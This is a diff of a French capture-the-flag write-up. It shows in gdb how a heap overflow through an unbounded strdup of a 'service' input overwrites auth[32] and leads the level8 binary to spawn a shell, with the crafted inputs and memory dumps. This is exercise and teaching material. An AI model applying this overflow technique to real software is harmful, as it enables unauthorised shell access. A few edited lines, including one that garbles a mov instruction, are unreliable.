@@ -18,7 +18,7 @@ if (auth[32] != '\0') {
 ```
 En effet, `0x20` équivaut à 32 en base10.
 
-Globalement, le code est une boucle infinie, qui attend différentes entrées. Si l'entrée est valide, on passera à la prochaine demande d'entrée.Il va donc nous falloir plusieurs étapes pour arriver à la conditon finale vu précédement. 
+Globalement, le code est une boucle infinie, qui attend différentes entrées. Si l'entrée est valide, on passera à la prochaine demande d'entrée. Il va donc nous falloir plusieurs étapes pour arriver à la conditon finale vue précédemment. 
 
 On remarque dans la première partie du code, que l'entrée attendu semble être `auth `.
 ```C
@@ -38,7 +38,7 @@ if (uVar3 < 0x1f) {
 }
 ```
 
-Ce bout de code semble être une condition liée à notre `input`. Si on saisis moins de `30` caractères, un appel a `strcpy` sera effectué. Nous allons tenter de vérifier cette hypothèse avec `gdb` en mettant un `breakpoint` au niveau du `strcpy` lorsqu'on saisis moins de `31` caractères et lorsqu'on en saisis plus. Cela nous permettra de voir si on fait appel à `strcpy`.
+Ce bout de code semble être une condition liée à notre `input`. Si on saisis moins de `30` caractères, un appel à `strcpy` sera effectué. Nous allons tenter de vérifiée cette hypothèse avec `gdb` en mettant un `breakpoint` au niveau du `strcpy` lorsqu'on saisis moins de `31` caractères et lorsqu'on en saisis plus. Cela nous permettra de voir si on fait appel à `strcpy`.
 
 ```
 > gdb level8
@@ -77,8 +77,8 @@ Nous allons donc afficher la valeur de `_auth` juste après le `strcpy`.
 0x804a008:	"AAAA\n"
 ```
 
-On retrouve bien nos `AAAA`, qui ont été copié dans `_auth `.
-Nous ne pourrons pas écrire 32 caractères après notre input `auth `, puisque ces caractères ne seront pas copiés en l'absence d'un appel à strcpy. Nous allons donc devoir trouver une autre solution pour arriver à notre condition finale qui est `auth[32] != '\0`.
+On retrouve bien nos `AAAA`, qui ont été copié dans `_auth`.
+Nous ne pourrons pas écrire 32 caractères après notre input `auth `, puisque ces caractères ne seront pas copiés en l'absence d'un appel à strcpy. Nous allons devoir trouver une autre solution pour arriver à notre condition finale qui est `auth[32] != '\0`.
 
 On voit au début du programme qu'il y a un printf qui va nous afficher les adresses de `_auth` et `_service`. On a déterminé précédemment l'adresse de `_auth`. Déterminons maintenant celle de `_service`.
 
@@ -102,7 +102,7 @@ On remarque que l'adresse de `_service` est décalée de `0x10` octets.
 _service = strdup(auStack137);
 ```
 
-Le reste du code n'est pas particulièrement explicite, et nous allons tenter de vérifier si, lorsqu'on saisi `service`, notre input va va mener à un appel à `strdup`.
+Le reste du code n'est pas particulièrement explicite, et nous allons tenter de vérifier si, lorsqu'on saisi `service`, notre `input` va mener à un appel à `strdup`.
 
 Nous allons `break` au niveau de ce `strdup` pour vérifier si la fonction est appelée.
 
@@ -121,19 +121,9 @@ Starting program: /home/user/level8/level8
 auth
 0x804a008, (nil)
 service AAAA
-
-Breakpoint 1, 0x080486ab in main ()
-> (gdb) r
-Starting program: /home/user/level8/level8
-(nil), (nil)
-auth
-0x804a008, (nil)
-service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-
-Breakpoint 1, 0x080486ab in main ()
 ```
 
-Notre hypothèse est vérifiée. Lorsqu'on saisit `service`, le programme va appeler la fonction `strdup`. Nous avons testé avec peu de caractères, mais également avec un grand nombres. `strdup` duplique la chaine tant qu'il ne rencontre pas de `\0`. Ici, il n'est pas précédé par une condition impliquant le nombre de caractères de l'entrée de l'utilisateur.
+Notre hypothèse est vérifiée. Lorsqu'on saisit `service`, le programme va appeler la fonction `strdup`. Nous n'avons pas testé avec un grand nombre de caractères puisque `strdup` duplique les caractères dans la chaine tant qu'il ne rencontre pas de `\0`. Ici, il n'est pas précédé par une condition impliquant le nombre de caractères de l'entrée de l'utilisateur.
 Il n'y a donc pas de limitation au niveau de `service`.
 
 Nous allons maintenant afficher la `stack` après l'appel à `strdup`.
@@ -156,32 +146,33 @@ Breakpoint 1, 0x080486ab in main ()
 0x804a008:	 "AAAA\n"
 > (gdb)  x/12wx 0x0804a008
 0x804a008:	0x41414141	0x0000000a	0x00000000	0x00000011
-^                    ^ 
-Adresse de _auth     Contenu de _auth
+^                     
+_auth     
 0x804a018:	0x42424220	0x00000a42	0x00000000	0x00020fe1
 ^
-Adresse de _service 
+_service 
 0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
 (gdb) x 0x0804a008+0x20
 0x804a028:	0x00000000
 ```
 Au moment de l'affichage de la `stack`, nous nous trouvons juste après `strdup`. 
 On a affiché `_auth` et on retrouve bien nos `AAAA`.
-On a également visualisé les adresses de `_auth` et `_service`, et on remarque bien que nos `BBBB` ont été dupliqué, puis assigné à la variable `_service`.
+On a également visualisé les adresses de `_auth` et `_service`, et on remarque bien que nos `BBBB` ont été dupliqués, puis assignés à la variable `_service`.
 
-On remarque que l'`adresse` de `auth + 0x20` est égal à `0`.  
+On remarque que l'adresse de `_auth + 0x20` est égal à `0`.  
 `0x20` est égal à 32 en `base 10`.   
 `auth + 0x20` est équivalent à `auth[32]`. 
-Nous avons vu précédement qu'il n'y avait pas de limitation avec `strdup`. On peut donc assigner une chaine de caractères suffisament grande à l'adresse de _service pour écraser l'octet à cette adresse de sorte à ce qu'il ne soit pas égal à 0. `auth + 0x20` sera donc différent de `\0`.
+Nous avons vu précédement qu'il n'y avait pas de limitation avec `strdup`. On peut donc assigner une chaine de caractères suffisament grande à l'adresse de `_service` pour écraser l'octet à cette adresse de sorte à ce qu'il ne soit pas égal à `0`. `_auth + 0x20` sera donc différent de `\0`.
 
-Nous allons maintenant calculer la taille de la chaine de caractères nécessaire à la réalisation de `l'exploit`.
+Nous allons maintenant calculer la taille de la chaine de caractères nécessaire à la réalisation de l'exploit.
 
 ```
-[adresse de _auth + 0x20] - [adresse de service]
-0x804a028 - 0x804a018 = 0x10
+[adresse de _auth + 0x20] - [adresse de service] = 0x804a028 - 0x804a018
+                                                 = 0x10
+                                                 = 16 (base 10)
 ```
 
-`0x10` est égal à `16` en `base10`. Nous devons donc écrire 16 caractères après `service` pour atteindre l'adresse de `auth + 0x20` et donc lancer un `shell`. On peut vérifier ça dans `gdb`.
+`0x10` est égal à `16` en `base10`. Nous devons donc écrire 16 caractères après `service` pour atteindre l'adresse de `_auth + 0x20` et donc lancer un `shell`. On peut vérifier ça dans `gdb`.
 
 ```
 > (gdb) r
@@ -197,45 +188,23 @@ Breakpoint 1, 0x080486ab in main ()
 > (gdb) x/20wx 0x0804a008
 0x804a008:	0x41414141	0x0000000a	0x00000000	0x00000019
       ^
-      Adresse de _auth
+      _auth
 0x804a018:	0x42424242	0x42424242	0x42424242	0x42424242
        ^
-       Adresse de _service
+      _service
 0x804a028:	0x0000000a	0x00020fd9	0x00000000	0x00000000
        ^              
-       Adresse de `_auth[32]` 
+       _auth[32]
 0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
 0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
 > (gdb) x/s 0x0804a008+0x20
 0x804a028:	 "\n"
 ```
 
-On voit bien que `auth + 0x20` n'est plus égal à `0`.
-Il y a maintenant un `\n`. On a vu précédement qu'il fallait écrire 16 caractères après `service` pour atteindre l'adresse de `auth + 0x20`. Il s'avère que c'est `16` + `\n`. 
-On peut vérifier cela en mettant 17 caractères.
+On voit bien que `_auth + 0x20` n'est plus égal à `0`.
+Il y a maintenant `0x0a` qui correspond au code ascii du caractère `\n`. On a vu précédemment qu'il fallait écrire 16 caractères après `service` pour atteindre l'adresse de `_auth + 0x20`. Il s'avère que c'est `16` + `\n`. 
+Notre condition `auth[32] != '\0'` est bien respectée.
 
-```
-> (gdb) r
-[...]
-(nil), (nil)
-auth AAAA
-0x804a008, (nil)
-serviceBBBBBBBBBBBBBBBBB
-
-Breakpoint 1, 0x080486ab in main ()
-> (gdb) ni
-0x080486b0 in main ()
-> (gdb) x/20wx 0x0804a008
-0x804a008:	0x41414141	0x0000000a	0x00000000	0x00000019
-0x804a018:	0x42424242	0x42424242	0x42424242	0x42424242
-0x804a028:	0x00000a42	0x00020fd9	0x00000000	0x00000000
-0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
-```
-
-On rappelle que la `stack` se remplit de droite à gauche, on voit bien qu'il y à un `B` qui a été écris à l'adresse de `auth + 0x20` ainsi qu'un `\n`.
-
-Notre condition `auth[32] != '\0'` est bien respécté.
 On suppose d'après le code, qu'il va falloir que notre dernière entrée soit `login` pour que la conditon `auth[32] != '\0'` soit exécutée. On va vérifier cela dans `gdb`.
 
 ```
@@ -247,7 +216,7 @@ On suppose d'après le code, qu'il va falloir que notre dernière entrée soit `
 [...]
 ```
 
-On observe ici que le programme va mettre `0x20` dans `eax`. Puis il y a un test avec `eax`.
+On observe ici que le programme va mettre `mov` dans `eax+0x20` dans `eax`. Puis il y a un test avec `eax`.
 Nous pouvons `break` à `0x080486e7` sur l'instruction `mov` afin de voir si la condition s'exécute bien lorsqu'on tape `login`. 
 
 ```
@@ -264,15 +233,21 @@ login
 Breakpoint 4, 0x080486e7 in main ()
 > (gdb) x/16wx 0x804a008
 0x804a008:	0x41414141	0x0000000a	0x00000000	0x00000019
+        ^
+        _auth
 0x804a018:	0x42424242	0x42424242	0x42424242	0x42424242
+        ^
+        _service
 0x804a028:	0x0000000a	0x00020fd9	0x00000000	0x00000000
+        ^
+        _auth[32]
 0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
 > (gdb) c
 Continuing.
 $
 ```
 
-Notre hypothèse est vérifié, lorsqu'on saisis `login`, le condition est bien exécutée. Il nous suffit de continuer, et un shell se lance puisque `auth[32] != '\0'`.
+Notre hypothèse est vérifiée, lorsqu'on saisis `login`, le condition est bien exécutée. Il nous suffit de continuer, et un `shell` se lance puisque `auth[32] != '\0'`.
 
 ```
 > ./level8
